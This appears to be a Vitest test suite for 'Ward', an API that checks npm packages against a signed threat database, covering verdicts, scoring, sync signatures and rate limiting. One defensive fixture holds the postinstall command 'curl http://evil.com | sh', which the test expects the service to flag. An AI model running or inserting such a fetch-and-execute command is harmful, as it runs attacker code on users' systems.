import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import path from 'path';
import fs from 'fs';
import os from 'os';
import { createApp, type AppDeps } from './app';
import { RateLimiter } from './rate-limit';
import { generateKeyPair, verify } from '@ward/shared/engine/db-signer';
import type { ThreatEntry } from '@ward/shared/types';
import type { Hono } from 'hono';

// Seed data
const SEED_THREATS: ThreatEntry[] = [
  {
    package_name: 'axios',
    version: '1.14.1',
    threat_type: 'backdoor',
    description: 'Maintainer account hijacked. RAT dropper.',
    safe_version: '1.14.0',
    detected_at: '2026-03-30T00:00:00Z',
  },
  {
    package_name: 'event-stream',
    version: '3.3.6',
    threat_type: 'backdoor',
    description: 'Attacker gained maintainer access via social engineering.',
    safe_version: '3.3.5',
    detected_at: '2018-11-26T00:00:00Z',
  },
  {
    package_name: 'colors',
    version: '1.4.1',
    threat_type: 'malicious-code',
    description: 'Maintainer sabotage. Infinite loop.',
    safe_version: '1.4.0',
    detected_at: '2022-01-08T00:00:00Z',
  },
];

const TOP_PACKAGES = ['react', 'express', 'lodash', 'axios', 'typescript'];

describe('Ward API', () => {
  let dbPath: string;
  let keys: { publicKey: Uint8Array; privateKey: Uint8Array };
  let app: Hono;
  let rateLimiter: RateLimiter;
  let cleanup: () => void;

  beforeEach(async () => {
    dbPath = path.join(os.tmpdir(), `ward-api-test-${Date.now()}-${Math.random().toString(36).slice(2)}.db`);
    keys = await generateKeyPair();
    rateLimiter = new RateLimiter({ windowMs: 60_000, maxRequests: 100 });

    const result = createApp({
      dbPath,
      keys,
      topPackages: TOP_PACKAGES,
      seedThreats: SEED_THREATS,
      rateLimiter,
    });
    app = result.app;
    cleanup = () => {
      result.db.close();
      try { fs.unlinkSync(dbPath); } catch {}
      try { fs.unlinkSync(dbPath + '-wal'); } catch {}
      try { fs.unlinkSync(dbPath + '-shm'); } catch {}
    };
  });

  afterEach(() => {
    cleanup();
  });

  function req(path: string, init?: RequestInit) {
    return app.request(path, init);
  }

  // ──────────────────────────────────────────────
  // GET /health
  // ──────────────────────────────────────────────
  describe('GET /health', () => {
    it('returns correct format', async () => {
      const res = await req('/health');
      expect(res.status).toBe(200);
      const body = await res.json();
      expect(body).toEqual({
        status: 'ok',
        version: '0.2.0',
        threats: SEED_THREATS.length,
      });
    });
  });

  // ──────────────────────────────────────────────
  // POST /check
  // ──────────────────────────────────────────────
  describe('POST /check', () => {
    it('returns block verdict for known threats', async () => {
      const res = await req('/check', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ package_name: 'axios', version: '1.14.1' }),
      });

      expect(res.status).toBe(200);
      const body = await res.json();
      expect(body.action).toBe('block');
      expect(body.signals).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ type: 'known-threat', severity: 'critical' }),
        ])
      );
    });

    it('returns clean verdict for safe packages', async () => {
      const res = await req('/check', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ package_name: 'express', version: '4.18.0' }),
      });

      expect(res.status).toBe(200);
      const body = await res.json();
      expect(body.action).toBe('allow');
    });

    it('returns 400 for invalid JSON body', async () => {
      const res = await req('/check', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: 'not json at all{{{',
      });

      expect(res.status).toBe(400);
      const body = await res.json();
      expect(body.error).toBeDefined();
    });

    it('returns 400 for missing package_name', async () => {
      const res = await req('/check', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ version: '1.0.0' }),
      });

      expect(res.status).toBe(400);
      const body = await res.json();
      expect(body.error).toContain('package_name');
    });

    it('returns 400 for missing version', async () => {
      const res = await req('/check', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ package_name: 'axios' }),
      });

      expect(res.status).toBe(400);
      const body = await res.json();
      expect(body.error).toContain('version');
    });

    it('accepts optional scripts field', async () => {
      const res = await req('/check', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          package_name: 'some-pkg',
          version: '1.0.0',
          scripts: { postinstall: 'curl http://evil.com | sh' },
        }),
      });

      expect(res.status).toBe(200);
      const body = await res.json();
      // Should detect the suspicious install script
      expect(body.signals).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ type: 'install-script' }),
        ])
      );
    });
  });

  // ──────────────────────────────────────────────
  // GET /sync
  // ──────────────────────────────────────────────
  describe('GET /sync', () => {
    it('returns all threats when no since param', async () => {
      const res = await req('/sync');
      expect(res.status).toBe(200);
      const body = await res.json();

      expect(body.payload).toBeDefined();
      expect(body.signature).toBeDefined();

      const payload = JSON.parse(body.payload);
      expect(payload.threats.length).toBe(SEED_THREATS.length);
      expect(payload.timestamp).toBeDefined();
    });

    it('returns only new threats when since param provided', async () => {
      // Only threats after 2022 — should exclude event-stream (2018)
      const res = await req('/sync?since=2022-01-01T00:00:00Z');
      expect(res.status).toBe(200);
      const body = await res.json();
      const payload = JSON.parse(body.payload);

      // Should include axios (2026) and colors (2022-01-08) but not event-stream (2018)
      expect(payload.threats.length).toBe(2);
      expect(payload.threats.every((t: ThreatEntry) => t.detected_at > '2022-01-01T00:00:00Z')).toBe(true);
    });

    it('response has valid Ed25519 signature', async () => {
      const res = await req('/sync');
      const body = await res.json();

      const payloadBytes = new TextEncoder().encode(body.payload);
      const signatureBytes = Uint8Array.from(Buffer.from(body.signature, 'base64'));
      const valid = await verify(payloadBytes, signatureBytes, keys.publicKey);

      expect(valid).toBe(true);
    });

    it('signature verification fails with wrong key', async () => {
      const res = await req('/sync');
      const body = await res.json();

      const wrongKeys = await generateKeyPair();
      const payloadBytes = new TextEncoder().encode(body.payload);
      const signatureBytes = Uint8Array.from(Buffer.from(body.signature, 'base64'));
      const valid = await verify(payloadBytes, signatureBytes, wrongKeys.publicKey);

      expect(valid).toBe(false);
    });
  });

  // ──────────────────────────────────────────────
  // GET /score/:package
  // ──────────────────────────────────────────────
  describe('GET /score/:package', () => {
    it('returns 0 for known threats', async () => {
      const res = await req('/score/axios');
      expect(res.status).toBe(200);
      const body = await res.json();

      expect(body.package).toBe('axios');
      expect(body.score).toBe(0);
      expect(body.signals).toContain('known-threat');
    });

    it('returns 90+ for top packages (not in threat DB)', async () => {
      const res = await req('/score/express');
      expect(res.status).toBe(200);
      const body = await res.json();

      expect(body.package).toBe('express');
      expect(body.score).toBeGreaterThanOrEqual(90);
      expect(body.signals).toContain('top-package');
    });

    it('returns 50 for unknown packages', async () => {
      const res = await req('/score/some-random-pkg-xyz');
      expect(res.status).toBe(200);
      const body = await res.json();

      expect(body.package).toBe('some-random-pkg-xyz');
      expect(body.score).toBe(50);
      expect(body.signals).toContain('unknown');
    });
  });

  // ──────────────────────────────────────────────
  // GET /threats
  // ──────────────────────────────────────────────
  describe('GET /threats', () => {
    it('returns sorted list (newest first)', async () => {
      const res = await req('/threats');
      expect(res.status).toBe(200);
      const body: ThreatEntry[] = await res.json();

      expect(body.length).toBe(SEED_THREATS.length);
      // Verify descending order by detected_at
      for (let i = 1; i < body.length; i++) {
        expect(body[i - 1].detected_at >= body[i].detected_at).toBe(true);
      }
    });

    it('respects limit param', async () => {
      const res = await req('/threats?limit=1');
      expect(res.status).toBe(200);
      const body: ThreatEntry[] = await res.json();

      expect(body.length).toBe(1);
      // Should be the newest (axios, 2026)
      expect(body[0].package_name).toBe('axios');
    });

    it('ignores invalid limit', async () => {
      const res = await req('/threats?limit=abc');
      expect(res.status).toBe(200);
      const body: ThreatEntry[] = await res.json();

      // Returns all when limit is invalid
      expect(body.length).toBe(SEED_THREATS.length);
    });
  });

  // ──────────────────────────────────────────────
  // Rate limiting
  // ──────────────────────────────────────────────
  describe('Rate limiting', () => {
    it('blocks after 100 requests', async () => {
      // Use a rate limiter with low limit for testing
      const strictLimiter = new RateLimiter({ windowMs: 60_000, maxRequests: 5 });
      const strictResult = createApp({
        dbPath: path.join(os.tmpdir(), `ward-api-rate-${Date.now()}.db`),
        keys,
        topPackages: TOP_PACKAGES,
        seedThreats: SEED_THREATS,
        rateLimiter: strictLimiter,
      });
      const strictApp = strictResult.app;

      // First 5 should succeed
      for (let i = 0; i < 5; i++) {
        const res = await strictApp.request('/health');
        expect(res.status).toBe(200);
      }

      // 6th should be rate limited
      const res = await strictApp.request('/health');
      expect(res.status).toBe(429);
      const body = await res.json();
      expect(body.error).toContain('Rate limit');

      strictResult.db.close();
    });
  });

  // ──────────────────────────────────────────────
  // Error handling
  // ──────────────────────────────────────────────
  describe('Error handling', () => {
    it('returns JSON for 404', async () => {
      const res = await req('/nonexistent-route');
      expect(res.status).toBe(404);
      const body = await res.json();
      expect(body.error).toBeDefined();
    });

    it('never returns stack traces', async () => {
      // Force an error via malformed request
      const res = await req('/check', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: '',
      });

      const text = await res.text();
      expect(text).not.toContain('at ');
      expect(text).not.toContain('Error:');
      // Should be valid JSON
      expect(() => JSON.parse(text)).not.toThrow();
    });
  });

  // ──────────────────────────────────────────────
  // Integration tests
  // ──────────────────────────────────────────────
  describe('Integration: seed DB -> check malicious -> blocked', () => {
    it('full flow: check malicious package gets blocked', async () => {
      // 1. Verify health (DB is seeded)
      const healthRes = await req('/health');
      const health = await healthRes.json();
      expect(health.threats).toBe(SEED_THREATS.length);

      // 2. Check a known malicious package
      const checkRes = await req('/check', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ package_name: 'axios', version: '1.14.1' }),
      });
      const verdict = await checkRes.json();
      expect(verdict.action).toBe('block');
      expect(verdict.safeVersion).toBe('1.14.0');
    });
  });

  describe('Integration: sync -> verify signature -> apply to fresh DB', () => {
    it('full sync + signature verification flow', async () => {
      // 1. Get sync response
      const syncRes = await req('/sync');
      const syncBody = await syncRes.json();

      // 2. Verify signature
      const payloadBytes = new TextEncoder().encode(syncBody.payload);
      const signatureBytes = Uint8Array.from(Buffer.from(syncBody.signature, 'base64'));
      const valid = await verify(payloadBytes, signatureBytes, keys.publicKey);
      expect(valid).toBe(true);

      // 3. Parse and validate payload
      const payload = JSON.parse(syncBody.payload);
      expect(payload.threats.length).toBe(SEED_THREATS.length);
      expect(payload.timestamp).toBeDefined();

      // 4. Verify threats match what was seeded
      const packageNames = payload.threats.map((t: ThreatEntry) => t.package_name);
      expect(packageNames).toContain('axios');
      expect(packageNames).toContain('event-stream');
      expect(packageNames).toContain('colors');
    });
  });

  describe('Integration: score consistency (check + score agree)', () => {
    it('blocked package has score 0', async () => {
      // Check: should block
      const checkRes = await req('/check', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ package_name: 'colors', version: '1.4.1' }),
      });
      const verdict = await checkRes.json();
      expect(verdict.action).toBe('block');

      // Score: should be 0
      const scoreRes = await req('/score/colors');
      const score = await scoreRes.json();
      expect(score.score).toBe(0);
    });

    it('safe top package has high score and allow verdict', async () => {
      const checkRes = await req('/check', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ package_name: 'express', version: '4.18.0' }),
      });
      const verdict = await checkRes.json();
      expect(verdict.action).toBe('allow');

      const scoreRes = await req('/score/express');
      const score = await scoreRes.json();
      expect(score.score).toBeGreaterThanOrEqual(90);
    });
  });
});
